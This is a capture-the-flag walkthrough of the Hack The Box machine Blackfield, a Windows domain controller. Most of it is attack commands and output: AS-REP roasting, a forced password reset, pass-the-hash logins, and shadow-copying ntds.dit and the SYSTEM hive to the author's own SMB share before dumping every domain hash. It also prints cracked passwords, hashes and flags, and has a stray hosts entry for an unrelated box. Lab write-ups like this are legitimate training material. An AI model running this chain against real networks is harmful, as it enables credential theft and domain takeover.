# HTB (Blackfield) Writeup
![](https://github.com/deannreid/CTF-Writeups/blob/main/HackTheBox/Retired/Hard/Blackfield/images/Pasted%20image%2020240518191049.png?raw=true)
### Website: [Hack The Box :: Hack The Box](https://app.hackthebox.com/machines/Blackfield)

## Recon
### Rustscan and NMap

```bash
┌──(kali㉿kali)-[~/Desktop/Dean Scripts]
└─$ python3 ./rs2nm.py 10.129.229.17
Just gonnae run a quick wee rustscan test
You selected: 10.129.229.17
Estimated Time Remaining: 1h 35m

Just kidding, only going to take a few seconds, they say


OOoh, There are a few ports open 
Gonnae copy these to NMAP for ye, for some intricate scanning...
(53,88,135,389,445,5985)

Host seems down or is blocking ping probes. Retrying without Host Discovery...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-18 20:01 BST
Nmap scan report for blackfield.local (10.129.229.17)
Host is up (0.028s latency).
rDNS record for 10.129.229.17: BLACKFIELD.local

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-19 02:01:12Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-19T02:01:15
|_  start_date: N/A
|_clock-skew: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```
Added mailing.htb to hosts file for simplicity
```bash
echo "10.129.208.99 mailing.htb" | sudo tee -a /etc/hosts
```
### Crackmap
```bash
┌──(kali㉿kali)-[~/Desktop/Dean Scripts]
└─$ crackmapexec smb blackfield.local                                                          
SMB         BLACKFIELD.local 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)

```

```bash
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
[+] IP: 10.129.229.17:445       Name: blackfield.local          Status: Authenticated
Disk                                    Permissions     Comment
----                                    -----------     -------
        ADMIN$                          NO ACCESS       Remote Admin
        C$                              NO ACCESS       Default share
        forensic                        NO ACCESS       Forensic / Audit share.
        IPC$                            READ ONLY       Remote IPC
        NETLOGON                        NO ACCESS       Logon server share 
        profiles$                       READ ONLY
        SYSVOL                          NO ACCESS       Logon server share 
```

#### SMB Checks
```bash
└─$ smbclient -N //blackfield.local/profiles$  
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jun  3 17:47:12 2020
  ..                                  D        0  Wed Jun  3 17:47:12 2020
  AAlleni                             D        0  Wed Jun  3 17:47:11 2020
  ABarteski                           D        0  Wed Jun  3 17:47:11 2020
  ABekesz                             D        0  Wed Jun  3 17:47:11 2020
  ABenzies                            D        0  Wed Jun  3 17:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 17:47:11 2020
  AChampken                           D        0  Wed Jun  3 17:47:11 2020
  ACheretei                           D        0  Wed Jun  3 17:47:11 2020
 %SNIP%
```
Popped all 300 odd folders into a Username File

##### Checked Access 
```bash
for i in $(cat /home/kali/Desktop/HackTheBox/Boxes/NonComp/Hard/Blackfield/Loot/users.txt); do python3 /opt/dean-python-scripts/pyscripts/GetNPUsers.py -dc-ip 10.129.229.17 BLACKFIELD/$i -no-pass; done
```

This then provided a few useful accounts to look into

```
[*] Getting TGT for svc_backup
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Getting TGT for audit2020
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Getting TGT for support
$krb5asrep$23$support@BLACKFIELD:d7a3b568f5dbb679180701f56c073414$2ec2e0f213977a4a7272904383ef18e696ea31738eaa8a59402a382a6976ac36f3c5107acbae2e671bf4064e8603156aaff2555e0e28895a6f74642731a16b6afab890d44c43270b4d48f431a818dc9f8097a2c79e7235358c37cd0971764bc9513222be94e7ea9147dc1fa0ecb75143854921fa3fd2d9bc5c309d82291578f683bea086a6b44867227f59481e382f86062d16404d25d3f42b166bcf03f27b374c4e8d83ae936760bc49b94639815926083af79dfcdbd3efb25e83504a4657f642e3c694d700a314df9a8de57f55789e9ef4d01d42b083a8645843b8b2b35f7223ed45ee746eaf5adad17f5d40a3
```

``` The password for 'support' was found to be '#00^BlackKnight' when cracked with rockyou```
## Exploitation

Loaded up Bloodhound to see if I could find any wins and it looks like the support user can change Audit2020's password
![](https://github.com/deannreid/CTF-Writeups/blob/main/HackTheBox/Retired/Hard/Blackfield/images/Pasted%20image%2020240518205925.png?raw=true)

I done a quick google search for changing passwords and came across this website
[Reset AD user password with Linux - Malicious Link - Blog by mubix - Rob Fuller](https://malicious.link/posts/2017/reset-ad-user-password-with-linux/)

So I then logged in with the Support User - Changed the Audit accounts password
```
┌──(kali㉿kali)-[~/…/NonComp/Hard/Blackfield/Loot]
└─$ rpcclient -U blackfield.local/support -I 10.129.229.17 dc01.blackfield.local

Password for [BLACKFIELD.LOCAL\support]:
rpcclient $> setuserinfo2 audit2020 23 ILov3Ch3323!
```
and then I could access this account
```
┌──(kali㉿kali)-[~/…/NonComp/Hard/Blackfield/Loot]
└─$ crackmapexec smb blackfield.local -u audit2020 -p 'ILov3Ch3323!'                           
SMB         BLACKFIELD.local 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         BLACKFIELD.local 445    DC01             [+] BLACKFIELD.local\audit2020:ILov3Ch3323! 
```

Connected back to SMB with the new user and found a few extra files
```
┌──(kali㉿kali)-[~/…/NonComp/Hard/Blackfield/Loot]
└─$ smbclient -U audit2020 //blackfield.local/forensic
Password for [WORKGROUP\audit2020]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Feb 23 13:03:16 2020
  ..                                  D        0  Sun Feb 23 13:03:16 2020
  commands_output                     D        0  Sun Feb 23 18:14:37 2020
  memory_analysis                     D        0  Thu May 28 21:28:33 2020
  tools                               D        0  Sun Feb 23 13:39:08 2020

                5102079 blocks of size 4096. 1694212 blocks available
smb: \> ls tools\
  .                                   D        0  Sun Feb 23 13:39:08 2020
  ..                                  D        0  Sun Feb 23 13:39:08 2020
  sleuthkit-4.8.0-win32               D        0  Sun Feb 23 13:39:03 2020
  sysinternals                        D        0  Sun Feb 23 13:35:25 2020
  volatility                          D        0  Sun Feb 23 13:35:39 2020

                5102079 blocks of size 4096. 1694192 blocks available
smb: \> ls commands_output\
  .                                   D        0  Sun Feb 23 18:14:37 2020
  ..                                  D        0  Sun Feb 23 18:14:37 2020
  domain_admins.txt                   A      528  Sun Feb 23 13:00:19 2020
  domain_groups.txt                   A      962  Sun Feb 23 12:51:52 2020
  domain_users.txt                    A    16454  Fri Feb 28 22:32:17 2020
  firewall_rules.txt                  A   518202  Sun Feb 23 12:53:58 2020
  ipconfig.txt                        A     1782  Sun Feb 23 12:50:28 2020
  netstat.txt                         A     3842  Sun Feb 23 12:51:01 2020
  route.txt                           A     3976  Sun Feb 23 12:53:01 2020
  systeminfo.txt                      A     4550  Sun Feb 23 12:56:59 2020
  tasklist.txt                        A     9990  Sun Feb 23 12:54:29 2020

                5102079 blocks of size 4096. 1694177 blocks available
```

after going through each of the files one by one I couldn't find anything of use except a list of domain admins (Administrator, **Ipwn3dYourCompany**) in the Memory Analysis folder, I found a load of Zip files 
```
5102079 blocks of size 4096. 1694177 blocks available
smb: \> ls memory_analysis\
  .                                   D        0  Thu May 28 21:28:33 2020
  ..                                  D        0  Thu May 28 21:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 21:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 21:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 21:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 21:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 21:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 21:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 21:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 21:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 21:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 21:27:00 2020
  smartscreen.zip                     A 33756344  Thu May 28 21:27:11 2020
  svchost.zip                         A 14408833  Thu May 28 21:27:19 2020
  taskhostw.zip                       A 34631412  Thu May 28 21:27:30 2020
  winlogon.zip                        A 14255089  Thu May 28 21:27:38 2020
  wlms.zip                            A  4067425  Thu May 28 21:27:44 2020
  WmiPrvSE.zip                        A 18303252  Thu May 28 21:27:53 2020
```

I done a quick google search to see if any of these might be useful and found lsass.zip which is where Mimikatz would dump plaintext credentials from. So I downloaded it and had a browse

```bash 
== LogonSession ==
authentication_id 153705 (25869)
session_id 1
username Administrator
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T17:59:04.506080+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-500
luid 153705
        == MSV ==
                Username: Administrator
                Domain: BLACKFIELD
                LM: NA
                NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
                SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
                DPAPI: 240339f898b6ac4ce3f34702e4a89550

```

Found the Administrator session but unfortunately, they must've changed their password as the key wasn't working when I tried connecting. 

I also found the svc_backup user
```bash
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef621
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
```

and it looks like we are winning
```bash
┌──(kali㉿kali)-[~/…/NonComp/Hard/Blackfield/Loot]
└─$ crackmapexec winrm 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
SMB         10.129.229.17   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
HTTP        10.129.229.17   5985   DC01             [*] http://10.129.229.17:5985/wsman
WINRM       10.129.229.17   5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)

```

Connected using evil-winrm with the account and successfully got the user flag 🤯
```
┌──(kali㉿kali)-[~/…/NonComp/Hard/Blackfield/Loot]
└─$ evil-winrm -i 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> ls


    Directory: C:\Users\svc_backup\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   2:26 PM             32 user.txt


*Evil-WinRM* PS C:\Users\svc_backup\Desktop> more user.txt
3920bb317a0bef51027e2852be64b543
```

## Privilege Escalation
### Enumeration
#### Checking current permissions
I had a quick look over what this account can actually do, and to keep it easy for us `SeBackUpPrivilege` which according to Microsoft will allow full system read access
[4672(S) Special privileges assigned to new logon. - Windows 10 | Microsoft Learn](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4672)

```
Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> net user svc_backup
User name                    svc_backup
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/23/2020 10:54:48 AM
Password expires             Never
Password changeable          2/24/2020 10:54:48 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2/23/2020 11:03:50 AM

Logon hours allowed          All

Local Group Memberships      *Backup Operators     *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

```

however, ofcourse that would be too easy. I tried reading the root.txt file on the Admin Desktop but it came back blank
```
BLACKFIELD\svc_backup> cd C:\Users\Administrator\Desktop
BLACKFIELD\svc_backup> ls
    Directory: C:\Users\Administrator\Desktop
Mode                LastWriteTime         Length Name                              
----                -------------         ------ ----                              
-a----        2/28/2020   4:36 PM            447 notes.txt                         
-a----        11/5/2020   8:38 PM             32 root.txt                                          
BLACKFIELD\svc_backup> more root.txt


BLACKFIELD\svc_backup> 

```

Because this is a backup account - I found out from [DiskShadow – Penetration Testing Lab (pentestlab.blog)](https://pentestlab.blog/tag/diskshadow/) that you can create custom scripts for disk shadow so I attempted to clone the C drive to another Drive letter
```
*Evil-WinRM* PS C:\Windows\System32> cd C:\programdata
*Evil-WinRM* PS C:\programdata> upload ../Scripts/disk.dsh
                                        
Info: Uploading /home/kali/Desktop/HackTheBox/Boxes/NonComp/Hard/Blackfield/Loot/../Scripts/disk.dsh to C:\programdata\disk.dsh
                                        
Data: 108 bytes of 108 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\programdata> cd C:\Windows\System32
*Evil-WinRM* PS C:\Windows\System32> diskshadow /s C:\programdata\disk.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  5/18/2024 9:32:10 PM

-> set context persistent nowriters
-> set metadata c:\programdata\df.cab
-> set verbose on
-> add volume c: alias df
-> create

Alias df for shadow ID {1511be1a-1459-4f79-8aaf-97c51240d1d2} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {da2834c8-12c1-4a8e-9aed-f2dc7cb3634b} set as environment variable.
Inserted file Manifest.xml into .cab file df.cab
Inserted file DisDBF2.tmp into .cab file df.cab

Querying all shadow copies with the shadow copy set ID {da2834c8-12c1-4a8e-9aed-f2dc7cb3634b}

        * Shadow copy ID = {1511be1a-1459-4f79-8aaf-97c51240d1d2}               %df%
                - Shadow copy set: {da2834c8-12c1-4a8e-9aed-f2dc7cb3634b}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 5/18/2024 9:32:11 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %df% z:
-> %df% = {1511be1a-1459-4f79-8aaf-97c51240d1d2}
The shadow copy was successfully exposed as z:\.
->

*Evil-WinRM* PS C:\Windows\System32> 
```

Once I sorted this step, I sent the `NTDS.DIT` file and the `HKLM\SYSTEM` registry Key to my SMB Share
```
*Evil-WinRM* PS C:\Windows\System32> net use \\10.10.14.135\boob /u:boob boob
The command completed successfully.

*Evil-WinRM* PS C:\Windows\System32> Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\10.10.14.135\boob\ntds.dit
*Evil-WinRM* PS C:\Windows\System32> reg.exe save hklm\system \\10.10.14.135\boob\systemreg
The operation completed successfully.

*Evil-WinRM* PS C:\Windows\System32> 

```

then used SecretsDump to get the key
```
┌──(kali㉿kali)-[~/…/NonComp/Hard/Blackfield/Loot]
└─$ impacket-secretsdump -system systemreg -ntds ntds.dit LOCAL
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee: :::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
```

And we have the Admin 
```
┌──(kali㉿kali)-[~/…/NonComp/Hard/Blackfield/Loot]
└─$ evil-winrm -i blackfield.local -u administrator -H 184fb5e5178480be64824d4cd53b99ee

Evil-WinRM shell v3.5
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   4:36 PM            447 notes.txt
-a----        11/5/2020   8:38 PM             32 root.txt
*Evil-WinRM* PS C:\Users\Administrator\Desktop> more root.txt
4375a629c7c67c8e29db269060c955cb
```
### User: 3920bb317a0bef51027e2852be64b543
### Root: 4375a629c7c67c8e29db269060c955cb
